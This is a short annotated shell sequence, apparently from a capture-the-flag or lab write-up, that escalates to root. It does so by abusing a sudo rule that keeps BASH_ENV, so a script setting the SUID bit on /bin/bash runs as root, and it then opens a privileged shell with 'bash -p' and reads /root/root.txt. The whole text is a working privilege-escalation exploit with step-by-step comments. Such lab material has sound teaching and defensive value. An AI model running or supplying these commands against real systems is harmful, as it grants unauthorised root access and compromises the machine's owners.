echo -e '#!/bin/bash\nchmod +s /bin/bash' > root.sh         ##Creates a script root.sh that gives /bin/bash the SUID bit — meaning any user running it gets root privileges (chmod +s).
chmod 777 root.sh
sudo BASH_ENV=root.sh /usr/bin/systeminfo         ##BASH_ENV is an environment variable that tells Bash to load a specific script before executing anything.
/bin/bash -p                                      ##Since systeminfo is a bash script, and sudo allows BASH_ENV to persist (as seen in env_keep), the script root.sh will be sourced as root before systeminfo runs.
cat /root/root.txt                                ## The -p flag tells Bash to not drop privileges — so because /bin/bash now has the SUID bit set, and you're running it, you become root.
